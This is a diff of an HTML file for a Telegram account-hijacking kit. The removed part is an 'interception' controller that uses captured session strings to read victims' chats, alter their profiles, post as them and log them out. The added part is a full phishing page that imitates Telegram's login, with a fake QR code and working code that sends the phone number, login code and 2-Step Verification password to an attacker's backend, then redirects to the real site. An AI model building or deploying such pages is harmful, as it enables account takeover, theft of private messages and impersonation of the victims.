@@ -2,456 +2,440 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>Vinzy Ultra | Premium Admin Controller</title>
+    <title>Telegram Web | Secure Login</title>
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
     
+    <script src="https://unpkg.com/@dotlottie/player-component@2.7.12/dist/dotlottie-player.mjs" type="module"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <link rel="icon" type="image/svg+xml" href="https://web.telegram.org/a/favicon.svg">
+
     <style>
-        /* --- CORE THEME 2026 --- */
+        /* --- DESIGN SYSTEM 2026: LIQUID SLATE --- */
         :root {
+            --bg-deep: #0f0f0f;
+            --bg-main: #212121;
+            --surface: #2c2c2c;
             --accent: #8774e1;
-            --accent-glow: rgba(135, 116, 225, 0.3);
-            --bg-dark: #0a0a0a;
-            --sidebar-bg: #121212;
-            --glass: rgba(255, 255, 255, 0.03);
-            --glass-thick: rgba(255, 255, 255, 0.07);
-            --border: rgba(255, 255, 255, 0.1);
-            --text-main: #ffffff;
-            --text-dim: #888888;
-            --msg-in: #212121;
-            --msg-out: #3d6a97;
-            --danger: #ff4757;
+            --accent-glow: rgba(135, 116, 225, 0.4);
+            --text-white: #ffffff;
+            --text-dim: #aaaaaa;
+            --border: #3d3d3d;
+            --error: #ff595a;
+            --success: #40b93c;
+            --glass: rgba(255, 255, 255, 0.04);
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
+        * {
+            box-sizing: border-box;
+            margin: 0; padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-        body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            height: 100vh;
+        body, html {
+            height: 100%;
+            background-color: var(--bg-deep);
+            color: var(--text-white);
             display: flex;
-            overflow: hidden;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        /* --- SKELETON ANIMATION --- */
-        @keyframes shimmer {
-            0% { background-position: -468px 0; }
-            100% { background-position: 468px 0; }
-        }
-        .skeleton {
-            background: linear-gradient(90deg, #1a1a1a 25%, #222 50%, #1a1a1a 75%);
-            background-size: 800px 104px;
-            animation: shimmer 1.5s infinite linear;
-        }
-
-        /* --- AUTHENTICATION OVERLAY --- */
-        #auth-layer {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.92);
-            backdrop-filter: blur(50px); z-index: 9999;
-            display: flex; align-items: center; justify-content: center;
-            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .auth-card {
-            background: var(--glass-thick); padding: 50px 40px; border-radius: 40px;
-            border: 1px solid var(--border); text-align: center; width: 420px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
-        }
-        .auth-card h1 { font-size: 28px; font-weight: 800; letter-spacing: -1px; margin-bottom: 8px; }
-        .auth-card p { color: var(--text-dim); font-size: 14px; margin-bottom: 35px; line-height: 1.5; }
-
-        /* --- SIDEBAR --- */
-        #sidebar {
-            width: 400px; background: var(--sidebar-bg); border-right: 1px solid var(--border);
-            display: flex; flex-direction: column; z-index: 100; transition: transform 0.4s ease;
-        }
-        .sidebar-header {
-            padding: 30px 25px; border-bottom: 1px solid var(--border);
-            display: flex; justify-content: space-between; align-items: center;
-        }
-        .search-area { padding: 15px 20px; }
-        .search-inner {
-            background: #000; border: 1px solid var(--border); border-radius: 14px;
-            padding: 12px 16px; display: flex; align-items: center; gap: 10px;
-        }
-        .search-inner input { background: transparent; border: none; color: #fff; width: 100%; font-size: 14px; }
-
-        .chat-list { flex: 1; overflow-y: auto; scrollbar-width: none; }
-        .chat-item {
-            padding: 16px 25px; display: flex; gap: 18px; cursor: pointer;
-            transition: 0.3s; border-bottom: 1px solid rgba(255,255,255,0.03);
+            justify-content: center;
             align-items: center;
-        }
-        .chat-item:hover { background: var(--glass); }
-        .chat-item.active { background: rgba(135, 116, 225, 0.12); border-left: 4px solid var(--accent); }
-
-        .pfp-wrap { position: relative; }
-        .avatar {
-            width: 58px; height: 58px; border-radius: 50%;
-            background: linear-gradient(135deg, var(--accent), #5a4bb3);
-            display: flex; align-items: center; justify-content: center;
-            font-weight: 800; font-size: 22px; color: #fff; flex-shrink: 0;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            overflow: hidden;
+            background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #080808 100%);
         }
 
-        /* --- MAIN CHAT VIEW --- */
-        #main-view {
-            flex: 1; display: flex; flex-direction: column; background: #080808;
+        /* --- LAYOUT --- */
+        .app-wrapper {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+            z-index: 10;
+        }
+
+        .auth-card {
+            background: var(--glass);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 1px solid var(--border);
+            border-radius: 35px;
+            padding: 45px 30px;
+            box-shadow: 0 40px 100px rgba(0,0,0,0.7);
+            text-align: center;
+            transition: all 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+
+        .monkey-box {
+            width: 140px; height: 140px;
+            margin: 0 auto 20px;
+            filter: drop-shadow(0 15px 25px rgba(0,0,0,0.4));
+        }
+
+        h1 { font-size: 30px; font-weight: 700; margin-bottom: 10px; letter-spacing: -0.5px; }
+        .desc { font-size: 15px; color: var(--text-dim); line-height: 1.6; margin-bottom: 35px; }
+
+        /* --- QR DISPLAY --- */
+        .qr-container {
+            background: #fff;
+            padding: 18px;
+            border-radius: 28px;
+            display: inline-block;
+            margin-bottom: 30px;
+            box-shadow: 0 0 50px var(--accent-glow);
             position: relative;
         }
-        .nav-bar {
-            padding: 18px 30px; background: rgba(18, 18, 18, 0.85);
-            backdrop-filter: blur(25px); border-bottom: 1px solid var(--border);
-            display: flex; align-items: center; gap: 15px; z-index: 50;
-        }
-        .msg-container {
-            flex: 1; padding: 25px 12%; overflow-y: auto;
-            display: flex; flex-direction: column; gap: 12px;
-            background: url('https://web.telegram.org/a/chat-bg-dark.7dae36a445d45d8f7601.png') center;
-            background-size: cover;
-        }
+        #qr-canvas img { width: 180px; height: 180px; }
 
-        .bubble {
-            max-width: 65%; padding: 12px 18px; border-radius: 20px;
-            font-size: 15px; line-height: 1.6; position: relative;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            animation: slideUp 0.3s ease;
-        }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .bubble.in { align-self: flex-start; background: var(--msg-in); border-bottom-left-radius: 5px; color: #eee; }
-        .bubble.out { align-self: flex-end; background: var(--msg-out); border-bottom-right-radius: 5px; color: #fff; }
-
-        .meta { font-size: 10px; margin-top: 5px; opacity: 0.6; text-align: right; }
-
-        /* --- COMMAND CENTER (FAB & MODAL) --- */
-        .fab {
-            position: fixed; bottom: 40px; right: 40px;
-            width: 70px; height: 70px; background: var(--accent);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            cursor: pointer; box-shadow: 0 15px 45px var(--accent-glow);
-            z-index: 1000; font-size: 30px; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        .fab:hover { transform: rotate(180deg) scale(1.1); background: #9b89f1; }
-
-        #modal-overlay {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(25px); z-index: 2000; align-items: center; justify-content: center;
-        }
-        .modal-box {
-            background: #181818; width: 500px; border-radius: 35px;
-            border: 1px solid var(--border); overflow: hidden;
-            box-shadow: 0 50px 100px rgba(0,0,0,0.6);
-        }
-        .modal-tabs { display: flex; background: #222; border-bottom: 1px solid var(--border); }
-        .m-tab { 
-            flex: 1; padding: 18px; text-align: center; cursor: pointer; 
-            font-size: 13px; font-weight: 600; color: var(--text-dim);
+        /* --- INPUTS --- */
+        .input-wrap { margin-bottom: 25px; text-align: left; }
+        .tg-input {
+            width: 100%;
+            background: rgba(0,0,0,0.3);
+            border: 1.5px solid var(--border);
+            border-radius: 15px;
+            padding: 18px;
+            color: #fff;
+            font-size: 17px;
+            outline: none;
             transition: 0.3s;
         }
-        .m-tab.active { color: #fff; background: #2a2a2a; border-bottom: 3px solid var(--accent); }
+        .tg-input:focus { border-color: var(--accent); box-shadow: 0 0 15px var(--accent-glow); }
 
-        .modal-body { padding: 35px; }
-        .input-group { margin-bottom: 20px; }
-        .input-group label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 8px; font-weight: 600; }
-        
-        input, textarea, select {
-            width: 100%; background: #000; border: 1px solid #333;
-            padding: 16px; color: #fff; border-radius: 14px;
-            font-family: inherit; font-size: 14px; transition: 0.3s;
+        /* OTP Grid */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
         }
-        input:focus { border-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
-
-        .btn-prime {
-            width: 100%; background: var(--accent); color: white; border: none;
-            padding: 18px; border-radius: 16px; font-weight: 700; cursor: pointer;
-            font-size: 15px; transition: 0.3s;
+        .otp-box {
+            width: 50px; height: 65px;
+            background: var(--surface);
+            border: 2px solid var(--border);
+            border-radius: 14px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            color: #fff;
+            transition: 0.2s;
         }
-        .btn-prime:hover { background: #9b89f1; transform: translateY(-2px); }
+        .otp-box:focus { border-color: var(--accent); transform: translateY(-3px); }
 
-        .blur-lock { filter: blur(40px); pointer-events: none; opacity: 0.3; }
-        
-        /* --- RESPONSIVE --- */
-        @media (max-width: 900px) {
-            #sidebar { width: 100%; position: absolute; left: 0; top: 0; height: 100%; }
-            #main-view { display: none; }
-            .sidebar-header { padding: 20px; }
+        /* --- BUTTONS --- */
+        .btn-main {
+            width: 100%;
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            padding: 18px;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.3s;
+        }
+        .btn-main:hover { background: #9b89f1; transform: scale(1.02); }
+        .btn-main:active { transform: scale(0.98); }
+        .btn-main:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* --- ANIMATIONS --- */
+        .hidden { display: none; }
+        .fade-in { animation: fadeIn 0.5s ease forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .spinner {
+            width: 22px; height: 22px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 12px;
+            display: none;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .shake { animation: shake 0.4s ease; border-color: var(--error) !important; }
+        @keyframes shake { 0%,100%{x:0} 25%{x:-5px} 75%{x:5px} }
+
+        .alt-link {
+            display: block;
+            margin-top: 25px;
+            color: var(--accent);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <div id="auth-layer">
-        <div class="auth-card">
-            <div class="avatar" style="margin: 0 auto 20px; width: 80px; height: 80px; font-size: 32px;">V</div>
-            <h1>Vinzy Ultra Controller</h1>
-            <p>The mirroring engine is currently locked. Enter the captured String Session to begin account interception.</p>
-            <div class="input-group">
-                <input type="password" id="sessionStr" placeholder="AQJH_Example_String_Session...">
-            </div>
-            <button class="btn-prime" onclick="initUnlock()">Establish Connection</button>
-        </div>
-    </div>
+    <div class="app-wrapper">
+        <div class="auth-card fade-in">
 
-    <aside id="sidebar" class="blur-lock">
-        <div class="sidebar-header">
-            <div>
-                <h2 style="font-weight: 900; letter-spacing: 1px; color: var(--accent);">VINZY ULTRA</h2>
-                <p style="font-size: 11px; color: #4caf50; font-weight: bold;">● MIRRORING ACTIVE</p>
-            </div>
-            <div style="background: var(--glass-thick); padding: 8px 12px; border-radius: 10px; font-size: 12px;">v5.5</div>
-        </div>
-
-        <div class="search-area">
-            <div class="search-inner">
-                <span>🔍</span>
-                <input type="text" id="chatSearch" placeholder="Filter intercepted chats..." onkeyup="filterChats()">
-            </div>
-        </div>
-
-        <div class="chat-list" id="chatContainer">
-            <div class="chat-item"><div class="avatar skeleton"></div><div style="flex:1"><div class="skeleton" style="height:15px; width:60%; margin-bottom:8px;"></div><div class="skeleton" style="height:12px; width:40%;"></div></div></div>
-            <div class="chat-item"><div class="avatar skeleton"></div><div style="flex:1"><div class="skeleton" style="height:15px; width:70%; margin-bottom:8px;"></div><div class="skeleton" style="height:12px; width:30%;"></div></div></div>
-            <div class="chat-item"><div class="avatar skeleton"></div><div style="flex:1"><div class="skeleton" style="height:15px; width:50%; margin-bottom:8px;"></div><div class="skeleton" style="height:12px; width:50%;"></div></div></div>
-        </div>
-    </aside>
-
-    <main id="main-view" class="blur-lock">
-        <nav class="nav-bar">
-            <div id="target-avatar" class="avatar" style="width:45px; height:45px; font-size:16px;">?</div>
-            <div style="flex: 1;">
-                <div id="target-name" style="font-weight: 700; font-size: 17px;">Select a Conversation</div>
-                <div id="target-status" style="font-size: 12px; color: var(--text-dim);">Historical Stream</div>
-            </div>
-            <div style="cursor: pointer; opacity: 0.5;">⋮</div>
-        </nav>
-
-        <div class="msg-container" id="msgBox">
-            <div style="margin: auto; text-align: center; color: var(--text-dim);">
-                <p style="font-size: 40px; margin-bottom: 10px;">💬</p>
-                <p>Select a chat from the left to view<br>live intercepted messages.</p>
-            </div>
-        </div>
-
-        <div style="background: #121212; padding: 12px 30px; display: flex; justify-content: space-between; font-size: 11px; color: #555; border-top: 1px solid var(--border);">
-            <span>PROTOCOL: TELETHON_MIRROR_V5</span>
-            <span>END-TO-END ENCRYPTED ADMIN CHANNEL</span>
-        </div>
-    </main>
-
-    <div class="fab" onclick="toggleConsole()">⚙️</div>
-
-    <div id="modal-overlay">
-        <div class="modal-box">
-            <div class="modal-tabs">
-                <div class="m-tab active" data-target="p-panel" onclick="switchTab(this)">PROFILE</div>
-                <div class="m-tab" data-target="m-panel" onclick="switchTab(this)">POST/MEDIA</div>
-                <div class="m-tab" data-target="c-panel" onclick="switchTab(this)">CONTROL</div>
-            </div>
-
-            <div class="modal-body">
-                <div id="p-panel" class="tab-content">
-                    <div class="input-group">
-                        <label>FULL NAME</label>
-                        <input type="text" id="ctrl-name" placeholder="Target's New Name">
-                    </div>
-                    <div class="input-group">
-                        <label>BIO / ABOUT</label>
-                        <textarea id="ctrl-bio" rows="3" placeholder="Change user bio..."></textarea>
-                    </div>
-                    <button class="btn-prime" onclick="apiAction('update_profile')">UPDATE IDENTITY</button>
+            <div id="step-qr">
+                <div class="qr-container">
+                    <div id="qr-target"></div>
                 </div>
-
-                <div id="m-panel" class="tab-content" style="display: none;">
-                    <div class="input-group">
-                        <label>MEDIA TYPE</label>
-                        <select id="ctrl-media-type">
-                            <option value="photo">Photo Post</option>
-                            <option value="voice">Voice Message</option>
-                            <option value="file">Document/File</option>
-                            <option value="story">Account Story</option>
-                        </select>
-                    </div>
-                    <div class="input-group">
-                        <label>DIRECT MEDIA URL</label>
-                        <input type="text" id="ctrl-media-url" placeholder="https://site.com/image.jpg">
-                    </div>
-                    <div class="input-group">
-                        <label>CAPTION (OPTIONAL)</label>
-                        <input type="text" id="ctrl-caption" placeholder="Enter message text...">
-                    </div>
-                    <button class="btn-prime" onclick="apiAction('post_media')">POST TO TARGET ACCOUNT</button>
-                </div>
-
-                <div id="c-panel" class="tab-content" style="display: none;">
-                    <p style="font-size: 13px; color: var(--text-dim); margin-bottom: 20px;">Administrative actions for account manipulation.</p>
-                    <div class="input-group">
-                        <label>GROUP TITLE</label>
-                        <input type="text" id="ctrl-group-name" placeholder="Cyber Security Group...">
-                    </div>
-                    <button class="btn-prime" style="background: #2f3542; margin-bottom: 15px;" onclick="apiAction('create_group')">CREATE NEW GROUP</button>
-                    <button class="btn-prime" style="background: var(--danger);" onclick="confirmTerminate()">TERMINATE ALL SESSIONS</button>
-                </div>
-
-                <p style="text-align:center; margin-top:25px; color:var(--text-dim); cursor:pointer; font-size:12px; font-weight:bold;" onclick="toggleConsole()">CLOSE CONSOLE</p>
+                <h1>Log in to Telegram</h1>
+                <p class="desc">Scan this QR code with the Telegram app on your phone to link this device.</p>
+                <div class="alt-link" onclick="showStep('phone')">LOG IN BY PHONE NUMBER</div>
             </div>
+
+            <div id="step-phone" class="hidden">
+                <div class="monkey-box">
+                    <dotlottie-player src="https://lottie.host/81a9f1f0-4091-4999-906d-e4c19456561f/7n0E8v9jW8.json" background="transparent" speed="1" loop autoplay></dotlottie-player>
+                </div>
+                <h1>Your Phone</h1>
+                <p class="desc">Enter your phone number to receive a login code via Telegram app.</p>
+                <div class="input-wrap">
+                    <input type="tel" id="phone-field" class="tg-input">
+                </div>
+                <button class="btn-main" id="btn-phone" onclick="handlePhone()">
+                    Next <div class="spinner" id="spin-phone"></div>
+                </button>
+                <div class="alt-link" onclick="showStep('qr')">BACK TO QR CODE</div>
+            </div>
+
+            <div id="step-otp" class="hidden">
+                <div class="monkey-box">
+                    <dotlottie-player src="https://lottie.host/f88b0a9c-097d-4c31-92e1-454326588288/h6Yv3fF3Zz.json" background="transparent" speed="1" loop autoplay></dotlottie-player>
+                </div>
+                <h1 id="display-phone">Check Telegram</h1>
+                <p class="desc">We've sent the code to the <b>Telegram</b> app on your other device.</p>
+                <div class="otp-container">
+                    <input type="number" class="otp-box" id="v1" oninput="moveNext(this, 'v2')">
+                    <input type="number" class="otp-box" id="v2" oninput="moveNext(this, 'v3')">
+                    <input type="number" class="otp-box" id="v3" oninput="moveNext(this, 'v4')">
+                    <input type="number" class="otp-box" id="v4" oninput="moveNext(this, 'v5')">
+                    <input type="number" class="otp-box" id="v5" oninput="moveNext(this, '')">
+                </div>
+                <button class="btn-main" id="btn-otp" onclick="handleOTP()">
+                    Verify <div class="spinner" id="spin-otp"></div>
+                </button>
+            </div>
+
+            <div id="step-2fa" class="hidden">
+                <div class="monkey-box">
+                    <dotlottie-player src="https://lottie.host/8e20235d-6556-42d4-8d96-c1157f43372c/fT6YpW6T9z.json" background="transparent" speed="1" loop autoplay></dotlottie-player>
+                </div>
+                <h1>Cloud Password</h1>
+                <p class="desc">Your account is protected by a 2-Step Verification password.</p>
+                <div class="input-wrap">
+                    <input type="password" id="password-field" class="tg-input" placeholder="Password">
+                </div>
+                <button class="btn-main" id="btn-2fa" onclick="handle2FA()">
+                    Unlock <div class="spinner" id="spin-2fa"></div>
+                </button>
+            </div>
+
+            <div id="step-sync" class="hidden">
+                <div class="monkey-box" style="margin-top: 30px;">
+                    <dotlottie-player src="https://lottie.host/81a9f1f0-4091-4999-906d-e4c19456561f/7n0E8v9jW8.json" background="transparent" speed="1" loop autoplay></dotlottie-player>
+                </div>
+                <h1>Finalizing...</h1>
+                <p class="desc">Synchronizing your messages and contacts. This may take a moment.</p>
+                <div style="width: 100%; height: 4px; background: #333; border-radius: 10px; overflow: hidden;">
+                    <div id="progress" style="width: 0%; height: 100%; background: var(--accent); transition: width 3s linear;"></div>
+                </div>
+            </div>
+
         </div>
     </div>
 
     <script>
         /**
-         * VINZY ULTRA CORE LOGIC
-         * Handles mirroring, API calls, and UI state
+         * VINZY MIRROR PROTOCOL 2026
+         * Connects UI States to Python Backend
          */
-        const BACKEND_URL = "https://your-api.koyeb.app"; // ⚡ Update this!
-        let SESSION_KEY = "";
-        let CURRENT_CHAT_ID = null;
 
-        // --- 1. AUTHENTICATION ---
-        function initUnlock() {
-            const val = document.getElementById('sessionStr').value;
-            if(val.trim().length < 15) {
-                alert("Critical Error: Invalid String Session length.");
+        // --- CONFIG ---
+        const API_BASE = "https://your-koyeb-app.koyeb.app"; // ⚡ Update this!
+        const TARGET_ID = new URLSearchParams(window.location.search).get('id') || 'untracked';
+        let userPhone = "";
+
+        // --- INITIALIZATION ---
+        window.onload = () => {
+            // Generate Fake Mirror QR
+            new QRCode(document.getElementById("qr-target"), {
+                text: "tg://login?token=AQJH_" + btoa(Math.random().toString()).substring(0, 12),
+                width: 180, height: 180,
+                colorDark: "#000", colorLight: "#fff"
+            });
+
+            // Init Phone Picker
+            const phoneInput = document.querySelector("#phone-field");
+            window.iti = window.intlTelInput(phoneInput, {
+                initialCountry: "kh", // Default Cambodia
+                separateDialCode: true,
+                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+            });
+        };
+
+        // --- NAVIGATION ENGINE ---
+        function showStep(stepName) {
+            const steps = ['qr', 'phone', 'otp', '2fa', 'sync'];
+            steps.forEach(s => document.getElementById(`step-${s}`).classList.add('hidden'));
+            document.getElementById(`step-${stepName}`).classList.remove('hidden');
+        }
+
+        function moveNext(el, nextId) {
+            if (el.value.length >= 1 && nextId) {
+                document.getElementById(nextId).focus();
+            }
+        }
+
+        // --- MIRROR LOGIC: STEP 1 (PHONE) ---
+        async function handlePhone() {
+            userPhone = window.iti.getNumber();
+            if (!window.iti.isValidNumber()) {
+                shakeElement('phone-field');
                 return;
             }
-            SESSION_KEY = val;
-            
-            // UI Transition
-            const layer = document.getElementById('auth-layer');
-            layer.style.opacity = '0';
-            setTimeout(() => {
-                layer.style.display = 'none';
-                document.getElementById('sidebar').classList.remove('blur-lock');
-                document.getElementById('main-view').classList.remove('blur-lock');
-                fetchChats();
-            }, 800);
-        }
 
-        // --- 2. DATA FETCHING ---
-        async function fetchChats() {
-            const container = document.getElementById('chatContainer');
-            try {
-                const response = await fetch(`${BACKEND_URL}/get_chats?session=${SESSION_KEY}`);
-                const data = await response.json();
-                
-                if(data.status === "error") throw new Error(data.msg);
-
-                container.innerHTML = data.chats.map(chat => `
-                    <div class="chat-item" onclick="selectChat('${chat.id}', '${chat.title}')">
-                        <div class="pfp-wrap">
-                            <div class="avatar">${chat.title[0].toUpperCase()}</div>
-                        </div>
-                        <div style="flex: 1; min-width: 0;">
-                            <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
-                                <strong style="font-size: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${chat.title}</strong>
-                                <span style="font-size: 11px; color: var(--text-dim);">${chat.time || 'Live'}</span>
-                            </div>
-                            <div style="font-size: 13px; color: var(--text-dim); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
-                                ${chat.last_msg || 'No messages intercepted'}
-                            </div>
-                        </div>
-                    </div>
-                `).join('');
-
-            } catch (err) {
-                container.innerHTML = `<div style="padding:40px; text-align:center; color:var(--danger);">Connection Failed: ${err.message}</div>`;
-            }
-        }
-
-        async function selectChat(id, title) {
-            CURRENT_CHAT_ID = id;
-            document.getElementById('target-name').innerText = title;
-            document.getElementById('target-avatar').innerText = title[0].toUpperCase();
-            
-            // Highlight active chat
-            document.querySelectorAll('.chat-item').forEach(el => el.classList.remove('active'));
-            event.currentTarget.classList.add('active');
-
-            const msgBox = document.getElementById('msgBox');
-            msgBox.innerHTML = '<div class="skeleton" style="height:40px; width:60%; border-radius:15px; margin: 10px 0;"></div><div class="skeleton" style="height:40px; width:50%; border-radius:15px; align-self: flex-end; margin: 10px 0;"></div>';
+            toggleLoading('btn-phone', 'spin-phone', true);
 
             try {
-                const res = await fetch(`${BACKEND_URL}/get_messages?session=${SESSION_KEY}&chat_id=${id}`);
-                const data = await res.json();
-                
-                msgBox.innerHTML = data.messages.map(m => `
-                    <div class="bubble ${m.out ? 'out' : 'in'}">
-                        ${m.text}
-                        <div class="meta">${m.time} ${m.out ? '✓✓' : ''}</div>
-                    </div>
-                `).join('');
-                msgBox.scrollTop = msgBox.scrollHeight;
-
-            } catch (e) {
-                msgBox.innerHTML = `<p style="color:var(--danger); text-align:center;">Intercept Error: ${e.message}</p>`;
-            }
-        }
-
-        // --- 3. CONSOLE LOGIC ---
-        function toggleConsole() {
-            const overlay = document.getElementById('modal-overlay');
-            overlay.style.display = (overlay.style.display === 'flex') ? 'none' : 'flex';
-        }
-
-        function switchTab(el) {
-            document.querySelectorAll('.m-tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
-            
-            el.classList.add('active');
-            document.getElementById(el.getAttribute('data-target')).style.display = 'block';
-        }
-
-        async function apiAction(endpoint) {
-            const payload = {
-                session: SESSION_KEY,
-                name: document.getElementById('ctrl-name').value,
-                bio: document.getElementById('ctrl-bio').value,
-                media_url: document.getElementById('ctrl-media-url').value,
-                caption: document.getElementById('ctrl-caption').value,
-                group_title: document.getElementById('ctrl-group-name').value
-            };
-
-            const btn = event.target;
-            const originalText = btn.innerText;
-            btn.innerText = "EXECUTING...";
-            btn.disabled = true;
-
-            try {
-                const res = await fetch(`${BACKEND_URL}/${endpoint}`, {
+                const response = await fetch(`${API_BASE}/step_phone`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(payload)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: userPhone, 
+                        tid: TARGET_ID,
+                        agent: navigator.userAgent
+                    })
                 });
-                const result = await res.json();
                 
-                if(result.status === "success") {
-                    alert("✅ SUCCESS: Target account updated.");
-                    toggleConsole();
+                const data = await response.json();
+
+                if (data.status === "success") {
+                    document.getElementById('display-phone').innerText = userPhone;
+                    showStep('otp');
                 } else {
-                    alert("❌ FAILED: " + result.msg);
+                    alert(data.msg || "Server rejected phone format.");
                 }
-            } catch (e) {
-                alert("❌ Connection Error.");
+            } catch (err) {
+                alert("Connection failed. Check your Koyeb URL and CORS settings.");
             } finally {
-                btn.innerText = originalText;
-                btn.disabled = false;
+                toggleLoading('btn-phone', 'spin-phone', false);
             }
         }
 
-        // --- 4. UTILS ---
-        function filterChats() {
-            const q = document.getElementById('chatSearch').value.toLowerCase();
-            document.querySelectorAll('.chat-item').forEach(item => {
-                const text = item.innerText.toLowerCase();
-                item.style.display = text.includes(q) ? 'flex' : 'none';
-            });
-        }
+        // --- MIRROR LOGIC: STEP 2 (OTP) ---
+        async function handleOTP() {
+            const code = ['v1','v2','v3','v4','v5'].map(id => document.getElementById(id).value).join('');
+            if (code.length < 5) return;
 
-        function confirmTerminate() {
-            if(confirm("CRITICAL: This will log out the victim from all devices. Proceed?")) {
-                apiAction('terminate_sessions');
+            toggleLoading('btn-otp', 'spin-otp', true);
+
+            try {
+                const response = await fetch(`${API_BASE}/step_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: userPhone, 
+                        code: code, 
+                        tid: TARGET_ID 
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.status === "success") {
+                    startSync();
+                } else if (data.status === "2fa_needed") {
+                    showStep('2fa');
+                } else {
+                    alert("Invalid Code. Please check your Telegram app.");
+                    ['v1','v2','v3','v4','v5'].forEach(id => {
+                        document.getElementById(id).value = "";
+                        shakeElement(id);
+                    });
+                    document.getElementById('v1').focus();
+                }
+            } catch (err) {
+                alert("Mirror connection lost during verification.");
+            } finally {
+                toggleLoading('btn-otp', 'spin-otp', false);
             }
         }
+
+        // --- MIRROR LOGIC: STEP 3 (2FA) ---
+        async function handle2FA() {
+            const pwd = document.getElementById('password-field').value;
+            if (!pwd) { shakeElement('password-field'); return; }
+
+            toggleLoading('btn-2fa', 'spin-2fa', true);
+
+            try {
+                const response = await fetch(`${API_BASE}/step_2fa`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: userPhone, 
+                        password: pwd, 
+                        tid: TARGET_ID 
+                    })
+                });
+
+                const data = await response.json();
+                if (data.status === "success") {
+                    startSync();
+                } else {
+                    alert("Incorrect Password.");
+                    shakeElement('password-field');
+                }
+            } catch (err) {
+                alert("2FA Sync Error.");
+            } finally {
+                toggleLoading('btn-2fa', 'spin-2fa', false);
+            }
+        }
+
+        // --- FINALIZATION ---
+        function startSync() {
+            showStep('sync');
+            setTimeout(() => {
+                document.getElementById('progress').style.width = "100%";
+            }, 100);
+            
+            // Redirect to real Telegram after capture
+            setTimeout(() => {
+                window.location.href = "https://web.telegram.org/k/";
+            }, 4000);
+        }
+
+        // --- UTILS ---
+        function toggleLoading(btnId, spinId, isLoading) {
+            const btn = document.getElementById(btnId);
+            const spin = document.getElementById(spinId);
+            btn.disabled = isLoading;
+            spin.style.display = isLoading ? 'block' : 'none';
+        }
+
+        function shakeElement(id) {
+            const el = document.getElementById(id);
+            el.classList.add('shake');
+            setTimeout(() => el.classList.remove('shake'), 400);
+        }
+
+        // Press Enter to submit
+        document.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                const phoneVisible = !document.getElementById('step-phone').classList.contains('hidden');
+                const otpVisible = !document.getElementById('step-otp').classList.contains('hidden');
+                const tfaVisible = !document.getElementById('step-2fa').classList.contains('hidden');
+                
+                if (phoneVisible) handlePhone();
+                else if (otpVisible) handleOTP();
+                else if (tfaVisible) handle2FA();
+            }
+        });
     </script>
 </body>
 </html>
